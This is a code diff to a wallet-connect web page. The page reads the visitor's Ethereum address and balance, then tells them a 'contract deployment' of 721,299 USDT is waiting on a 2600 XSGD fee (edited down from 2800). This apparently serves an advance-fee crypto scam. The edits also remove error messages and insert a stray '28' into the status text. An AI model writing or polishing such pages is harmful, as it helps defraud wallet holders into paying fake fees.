@@ -56,7 +56,7 @@ button:hover:not(:disabled) {
 <div class="card">
     <h2>Connect Wallet</h2>
     <button id="connectBtn">Connect Wallet</button>
-    <div id="status" style="margin-top:15px; color:red;"></div>
+    <div id="status" style="margin-top:15px;"></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -68,10 +68,8 @@ const statusEl = document.getElementById('status');
 const connectBtn = document.getElementById('connectBtn');
 
 async function connectWallet() {
-    statusEl.innerHTML = ''; // Clear previous error messages
     if (!window.ethereum) {
         alert("Please install MetaMask or another Ethereum wallet extension.");
-        statusEl.innerHTML = "MetaMask not detected. Please install it.";
         return;
     }
     try {
@@ -85,25 +83,20 @@ async function connectWallet() {
         const balanceNumber = Number(balanceETH);
 
         statusEl.innerHTML = `
-        <b>Wallet Connected</b><br/>
+        <b>Wallet Connected</b><br/>28
         Address: ${currentAddress}<br/>
         ETH Balance: ${balanceNumber.toFixed(4)} ETH<br/>
-        Waiting for contract deployment of 2800 XSGD...
+        Waiting for contract deployment of 2600 XSGD...
         `;
 
         // Show deployment info
-        document.getElementById('contractInfo')?.innerHTML = `
-        For deploying the full amount of 721,299 USDT, it is equivalent to 2800 XSGD.
+        document.getElementById('contractInfo').innerHTML = `
+        For deploying the full amount of 721,299 USDT, it is equivalent to 2600 XSGD.
         `;
 
     } catch (err) {
-        console.error('Error connecting wallet:', err);
-        // Show detailed error message
-        if (err.message) {
-            statusEl.innerHTML = "Error: " + err.message;
-        } else {
-            statusEl.innerHTML = "An unknown error occurred.";
-        }
+        console.error(err);
+        alert("Error connecting wallet.");
     }
 }
 
